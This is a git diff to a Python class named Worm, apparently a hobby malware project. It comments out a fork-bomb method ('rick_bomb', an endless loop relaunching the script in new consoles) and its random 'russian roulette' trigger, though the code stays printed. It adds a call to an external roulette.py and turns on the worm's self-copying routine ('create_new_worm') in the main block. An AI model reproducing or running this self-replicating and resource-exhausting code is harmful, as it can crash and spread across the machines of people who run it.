@@ -190,15 +190,19 @@ class Worm:
         except:
             logging.warning("exception occurred: no rick?")
     
-    def rick_bomb(self):
-        while True:
-            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
+    # def rick_bomb(self):
+    #     while True:
+    #         subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
         
-    def russian_roulette(self):
-        num = random.randint(0, 5)
-        if ROULETTE == num:
-            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!HIT NUMBER!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-            self.rick_bomb()
+    # def russian_roulette(self):
+    #     num = random.randint(0, 5)
+    #     if ROULETTE == num:
+    #         print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!HIT NUMBER!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+    #         self.rick_bomb()
+    
+    def run_roulette(self):       
+        subprocess.run(executable=f"{self.own_path}\\..\\roulette.py")
+        
         
     def start_worm_actions(self):
         print(self.target_dir_list)
@@ -209,7 +213,7 @@ class Worm:
         self.list_directories(self.path)
         
         try:
-            self.russian_roulette()
+            #self.russian_roulette()
             self.create_new_worm()  
         except:
             logging.warning("something went wrong")
@@ -219,13 +223,11 @@ class Worm:
         #self.time_to_rick()
         #self.connection_iterator()
        
-        
-    
-    
 if __name__=="__main__":
     current_directory = os.path.abspath("")
     worm = Worm(path=current_directory)
-    # worm.start_worm_actions()
+    worm.run_roulette()
+    worm.start_worm_actions()
     # with open('log.txt', 'w') as f:
     #     f.write(f"{perf_counter() - worm.start:.5f}")
     
